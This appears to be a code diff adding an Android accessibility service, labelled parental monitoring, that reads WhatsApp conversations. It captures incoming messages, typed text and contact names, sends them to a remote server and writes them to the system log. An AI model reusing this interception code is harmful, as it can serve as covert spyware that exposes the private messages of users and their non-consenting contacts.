@@ -1,0 +1,479 @@
+package com.example.parentalmonitor
+
+
+
+import android.accessibilityservice.AccessibilityService
+
+import android.util.Log
+
+import android.view.accessibility.AccessibilityEvent
+
+import android.view.accessibility.AccessibilityNodeInfo
+
+import retrofit2.Call
+
+import retrofit2.Response
+
+
+
+class WhatsAppAccessibilityService : AccessibilityService() {
+
+private val TAG = "WhatsAppService"
+
+private var lastMessage: String? = null // Para evitar envios duplicados
+
+private var lastEventTime: Long = 0 // Para evitar eventos duplicados
+
+private val EVENT_DEBOUNCE_TIME = 500L // Mantido em 500ms
+
+private var lastSentMessage: String? = null // Para armazenar a última mensagem digitada
+
+private var isMessageSent: Boolean = false // Flag para confirmar envio
+
+
+
+override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+
+Log.d(TAG, "Evento de acessibilidade recebido: ${event?.eventType}, Pacote: ${event?.packageName}, Classe: ${event?.className}")
+
+if (event?.packageName != "com.whatsapp") {
+
+Log.d(TAG, "Evento ignorado: pacote não é WhatsApp (${event?.packageName})")
+
+return
+
+}
+
+
+
+val currentTime = System.currentTimeMillis()
+
+if (currentTime - lastEventTime < EVENT_DEBOUNCE_TIME) {
+
+Log.d(TAG, "Evento ignorado: muito próximo do último evento (${currentTime - lastEventTime}ms)")
+
+return
+
+}
+
+lastEventTime = currentTime
+
+
+
+when (event.eventType) {
+
+AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
+
+AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
+
+Log.d(TAG, "Evento relevante detectado: ${event.eventType}")
+
+val rootNode = rootInActiveWindow ?: run {
+
+Log.w(TAG, "Root node não encontrado")
+
+return
+
+}
+
+val contactOrGroup = getContactOrGroupName(rootNode)
+
+val message = getMessage(rootNode)
+
+val direction = getMessageDirection(rootNode, message)
+
+
+
+Log.d(TAG, "Dados capturados - Contato/Grupo: $contactOrGroup, Mensagem: $message, Direction: $direction")
+
+
+
+if (message != null && direction != null && message != lastMessage) {
+
+val contactOrGroupToSend = contactOrGroup ?: "unknown"
+
+Log.d(TAG, "Mensagem pronta para envio - Contato/Grupo: $contactOrGroupToSend, Mensagem: $message, Direction: $direction")
+
+sendMessageToServer(contactOrGroupToSend, message, direction)
+
+lastMessage = message
+
+if (direction == "sent") {
+
+lastSentMessage = null
+
+isMessageSent = false
+
+}
+
+} else {
+
+Log.w(TAG, "Falha ou duplicata ao capturar mensagem ou direction - Mensagem: $message, Direction: $direction")
+
+}
+
+}
+
+AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+
+if (event.className == "android.widget.EditText" && event.text.isNotEmpty()) {
+
+val typedText = event.text.joinToString()
+
+if (typedText.isNotEmpty() && !typedText.contains("Digite uma mensagem")) {
+
+lastSentMessage = typedText
+
+Log.d(TAG, "Texto digitado capturado: $lastSentMessage")
+
+}
+
+}
+
+}
+
+AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+
+if ((event.className == "android.widget.ImageButton" || event.className == "android.widget.Button") &&
+
+lastSentMessage != null) {
+
+isMessageSent = true
+
+Log.d(TAG, "Evento de envio detectado, mensagem: $lastSentMessage")
+
+val rootNode = rootInActiveWindow ?: return
+
+val direction = getMessageDirection(rootNode, lastSentMessage)
+
+if (direction != null) {
+
+sendMessageToServer(getContactOrGroupName(rootNode) ?: "unknown", lastSentMessage!!, direction)
+
+lastMessage = lastSentMessage
+
+lastSentMessage = null
+
+isMessageSent = false
+
+}
+
+}
+
+}
+
+else -> {
+
+Log.d(TAG, "Evento ignorado: tipo não relevante (${event.eventType})")
+
+}
+
+}
+
+}
+
+
+
+private fun getContactOrGroupName(node: AccessibilityNodeInfo): String? {
+
+for (i in 0 until node.childCount) {
+
+val child = node.getChild(i) ?: continue
+
+if (child.className == "android.widget.TextView" && child.text != null) {
+
+val text = child.text.toString()
+
+if (text.isNotEmpty() &&
+
+!text.contains("WhatsApp", ignoreCase = true) &&
+
+!text.contains("Digite uma mensagem") &&
+
+!text.matches(Regex("\\d{1,2}:\\d{2}")) && // Ignora timestamps
+
+!text.contains("Mensagem não lida") &&
+
+!text.contains("Ligação de voz") && // Ignora notificações de ligação
+
+!text.contains("Você reagiu com") && // Ignora reações
+
+!text.contains("mais") && !text.contains("pessoas") && // Ignora listas de participantes
+
+!text.contains("Pergunte à Meta AI ou pesquise") && // Ignora mensagens geradas pelo WhatsApp
+
+// Prioriza texto no topo da hierarquia ou em áreas de título
+
+(i < 2 || child.isFocusable || child.parent?.className?.contains("Toolbar") == true || child.parent?.className?.contains("ActionBar") == true)) {
+
+Log.d(TAG, "Contato/Grupo encontrado: $text")
+
+return text
+
+}
+
+}
+
+val result = getContactOrGroupName(child)
+
+if (result != null) return result
+
+}
+
+return null
+
+}
+
+
+
+private fun getMessage(node: AccessibilityNodeInfo): String? {
+
+val contactOrGroup = getContactOrGroupName(node)
+
+for (i in 0 until node.childCount) {
+
+val child = node.getChild(i) ?: continue
+
+if (child.className == "android.widget.TextView" && child.text != null) {
+
+val text = child.text.toString()
+
+if (text.isNotEmpty() &&
+
+!text.contains("Digite uma mensagem") &&
+
+!text.contains("Mensagem") && // Ignora placeholders
+
+text != contactOrGroup && // Evita capturar o nome do contato/grupo como mensagem
+
+!text.contains("Mensagem não lida") &&
+
+!text.contains("Ligação de voz") && // Ignora notificações de ligação
+
+!text.contains("Você reagiu com") && // Ignora reações
+
+!text.contains("mais") && !text.contains("pessoas") && // Ignora listas de participantes
+
+!text.contains("Pergunte à Meta AI ou pesquise") && // Ignora mensagens geradas pelo WhatsApp
+
+!text.contains("Arquivadas") && // Ignora rótulos da interface
+
+!isInEditTextContext(node)) { // Ignora texto do campo de entrada
+
+Log.d(TAG, "Mensagem encontrada: $text")
+
+return text
+
+}
+
+}
+
+val result = getMessage(child)
+
+if (result != null) return result
+
+}
+
+if (isMessageSent && lastSentMessage != null) {
+
+Log.d(TAG, "Mensagem enviada encontrada via fallback: $lastSentMessage")
+
+return lastSentMessage
+
+}
+
+return null
+
+}
+
+
+
+private fun isInEditTextContext(node: AccessibilityNodeInfo): Boolean {
+
+var parent = node.parent
+
+while (parent != null) {
+
+if (parent.className == "android.widget.EditText") {
+
+return true
+
+}
+
+parent = parent.parent
+
+}
+
+return false
+
+}
+
+
+
+private fun getMessageDirection(node: AccessibilityNodeInfo, message: String?): String? {
+
+if (message == null) return null
+
+
+
+// Tentar encontrar indicadores de mensagem enviada (ticks, etc.)
+
+fun checkSent(n: AccessibilityNodeInfo): Boolean {
+
+if (n.className == "android.widget.ImageView" && n.contentDescription?.contains("Entregue", ignoreCase = true) == true) {
+
+return true
+
+}
+
+for (i in 0 until n.childCount) {
+
+if (checkSent(n.getChild(i) ?: continue)) return true
+
+}
+
+return false
+
+}
+
+
+
+if (checkSent(node)) {
+
+Log.d(TAG, "Direction: sent (mensagem: $message, encontrado indicador de envio)")
+
+return "sent"
+
+}
+
+
+
+// Tentar encontrar indicadores de mensagem recebida (ausência de ticks, presença de remetente)
+
+fun checkReceived(n: AccessibilityNodeInfo, msg: String?): Boolean {
+
+var hasSender = false
+
+var hasTicks = false
+
+fun traverse(current: AccessibilityNodeInfo) {
+
+if (current.className == "android.widget.TextView" && current.text?.toString()?.length ?: 0 > 2 && current.text?.toString() != msg && current.isFocusable) {
+
+hasSender = true
+
+}
+
+if (current.className == "android.widget.ImageView" && current.contentDescription?.contains("Entregue", ignoreCase = true) == true) {
+
+hasTicks = true
+
+}
+
+for (i in 0 until current.childCount) {
+
+traverse(current.getChild(i) ?: continue)
+
+}
+
+}
+
+traverse(n)
+
+return hasSender && !hasTicks
+
+}
+
+
+
+if (checkReceived(node, message)) {
+
+Log.d(TAG, "Direction: received (mensagem: $message, remetente detectado e sem indicador de envio)")
+
+return "received"
+
+}
+
+
+
+Log.w(TAG, "Direction não identificado")
+
+return null
+
+}
+
+
+
+private fun sendMessageToServer(contactOrGroup: String, message: String, direction: String) {
+
+val sharedPreferences = getSharedPreferences("ParentalMonitorPrefs", MODE_PRIVATE)
+
+val childId = sharedPreferences.getString("childID", "unknown_child") ?: "unknown_child"
+
+
+
+val request = Request(
+
+message = message,
+
+childId = childId,
+
+messageType = "WHATSAPP_MESSAGE",
+
+timestamp = System.currentTimeMillis(),
+
+contactOrGroup = contactOrGroup,
+
+direction = direction
+
+)
+
+
+
+val call = RetrofitClient.apiService.sendNotification(request)
+
+call.enqueue(object : retrofit2.Callback<Void> {
+
+override fun onResponse(call: Call<Void>, response: Response<Void>) {
+
+if (response.isSuccessful) {
+
+Log.d(TAG, "Mensagem enviada para o servidor: $message (Contato/Grupo: $contactOrGroup, Direction: $direction)")
+
+} else {
+
+Log.w(TAG, "Falha ao enviar mensagem: ${response.code()} - ${response.message()}")
+
+}
+
+}
+
+
+
+override fun onFailure(call: Call<Void>, t: Throwable) {
+
+Log.e(TAG, "Erro ao enviar mensagem: ${t.message}", t)
+
+}
+
+})
+
+}
+
+
+
+override fun onInterrupt() {
+
+Log.d(TAG, "Serviço de acessibilidade interrompido")
+
+}
+
+
+
+override fun onServiceConnected() {
+
+Log.d(TAG, "Serviço de acessibilidade conectado")
+
+}
+
+}
